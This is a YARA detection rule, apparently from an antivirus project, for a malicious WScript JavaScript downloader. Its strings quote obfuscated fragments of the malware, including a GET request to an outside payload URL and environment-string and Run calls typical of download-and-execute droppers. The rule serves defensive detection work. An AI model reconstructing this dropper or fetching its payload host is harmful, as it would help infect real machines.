rule sig_20160428_cfdd8d4bef7183f46a90035641adfc93 {
  meta:
    description = "datamaliciousorder - file 20160428_cfdd8d4bef7183f46a90035641adfc93.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6a3036379406bee06002b6031faea7a62703710f8acaa44458dd34a6746f6972"

  strings:
    $s1  = "function QvjRwzEnwTsyMutSnqFvw() {return GdzRypSgjWitLypAvlCgj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function NobOpwPtbSxgYsuKviLvl(IclMtkIngFzjLuvNwxIcq){GdzRypSgjWitLypAvlCgj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "return MbeIaoFgaAteWpbDazFnl - ZupWlpKoyEqoVcxOdbCja;};" fullword ascii
    $s4  = "KphXtkYbyUlsLhrZeqCet[EspHdnQwvWxxJseOmpJol](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s5  = "var GdzRypSgjWitLypAvlCgj = function UpaGemFolBkaRaeZdnShg() {return YyrLawKxpNxeImhNgdAvf[TnbRkdDgoAauVggVqeGvd](\"WScript\"+\"" ascii
    $s6  = "var YyrLawKxpNxeImhNgdAvf = this[\"WScript\"];" fullword ascii
    $s7  = "function NobOpwPtbSxgYsuKviLvl(IclMtkIngFzjLuvNwxIcq){GdzRypSgjWitLypAvlCgj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s8  = "function QvjRwzEnwTsyMutSnqFvw() {return GdzRypSgjWitLypAvlCgj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function IroGqtPoyWdiYabTzlBtp(MbeIaoFgaAteWpbDazFnl, ZupWlpKoyEqoVcxOdbCja){TldJjgYojBcjTqnCatSwk = TldJjgYojBcjTqnCatSwk * 1; " ascii
    $s10 = "if (KphXtkYbyUlsLhrZeqCet[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "var GdzRypSgjWitLypAvlCgj = function UpaGemFolBkaRaeZdnShg() {return YyrLawKxpNxeImhNgdAvf[TnbRkdDgoAauVggVqeGvd](\"WScript\"+\"" ascii
    $s12 = "function EtdKsqQqpVmuAvgPtkCyx(){return ChrZhlUcbMuaOxyHzgJfk + \"\";};" fullword ascii
    $s13 = "function IvlEnaOawTgsTzjKhyFvr() {return ((NmgUyvYifDaeJyiHfwIyn == true) && (NmgUyvYifDaeJyiHfwIyn == UskZljXfdFxyNfwZniTlq)) ?" ascii
    $s14 = "} catch(TcyCirCqbWvvJbqBltKqz){};};" fullword ascii
    $s15 = "var WxjLqoRlzSygZzpDtoAtb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "function IkuNhfYneAkzEkrSvaXwa()" fullword ascii
    $s17 = "var NmgUyvYifDaeJyiHfwIyn = false;" fullword ascii
    $s18 = "function MnkQvxYbgUhhLtgIdsEzp(){return 23;};" fullword ascii
    $s19 = "function ZlmHeiJpnAcxHwzWusHvk(KsuIcoJloLzqPukMboOzl) {var XmkXmzUvmBfwKnvVpfCdo = (1, 2, 3, 4, 5, KsuIcoJloLzqPukMboOzl); retur" ascii
    $s20 = "NfsYfkKzwDpbNvvQdrDuh = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}